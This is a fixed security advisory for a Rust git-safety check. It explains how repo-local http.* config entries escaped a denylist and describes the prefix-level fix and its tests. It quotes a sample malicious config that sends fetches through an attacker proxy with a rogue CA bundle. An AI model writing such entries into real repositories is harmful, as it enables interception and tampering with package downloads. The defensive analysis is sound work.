# GH #28 — Repo-local `http.*` git config escapes the safety check (proxy/CA MITM)

**Source:** adversarial review (shared M2/H1; Review 2 H1), GitHub issue #28
**Status:** fixed (2026-08-04)
**Severity:** high
**Lines:** `src/git.rs` `UNSAFE_KEY_PREFIXES` (was lines 157-166), `local_config_is_safe()`

## What happens

`src/git.rs` `UNSAFE_KEY_PREFIXES` did not include `"http."`, and
`UNSAFE_CORE_KEYS` did not include `http.sslCAInfo` or `http.proxy`.
`local_config_is_safe()` therefore passed `.git/config` entries like:

```ini
[http]
    proxy = http://attacker:8080
    sslCAInfo = /tmp/evil-ca.pem
```

`SAFE_PRE` sets `http.sslVerify=true` via `-c`, but command-line `-c` does
**not** reliably override repo-local `http.*` because URL-scoped sections
(`[http "https://aur.archlinux.org"]`) take precedence over the global `-c`
value. A malicious `build()` that writes to the cached clone's `.git/config`
could therefore route the next `git fetch` through an attacker-controlled
proxy presenting an attacker-controlled CA bundle, defeating clone/fetch
integrity and letting an attacker serve a commit that passes the gate's
deterministic rules.

## Fix

Add `"http."` to `UNSAFE_KEY_PREFIXES` in `src/git.rs`. Blocking the prefix
wholesale in `local_config_is_safe()` is the only robust kill switch because
URL-scoped `[http "..."]` sections override command-line `-c`. This covers
`http.proxy`, `http.sslCAInfo`, `http.sslVerify`, and any future `http.*`
knob that could weaken transport integrity.

## Verification

- `cargo test --all-targets` — `repo_local_protocol_override_is_rejected`
  now also asserts that `http.proxy`, `http.sslcainfo`, and a URL-scoped
  `http.https://aur.archlinux.org.proxy` local config entry are all rejected.
- `cargo clippy --all-targets -- -D warnings` clean.
- `cargo run --quiet -- selftest` passes.

## Lesson

`-c` overrides are not a complete defence against repo-local config. Any
config namespace that admits URL-scoped subsections (`http.<url>.*`,
`url.<base>.insteadOf`, etc.) can override a global `-c` value, so the
repo-local config must be denylisted at the prefix level rather than
overridden per-key. Extends #5, which hardened the git invocation but
missed `http.*` specifically.
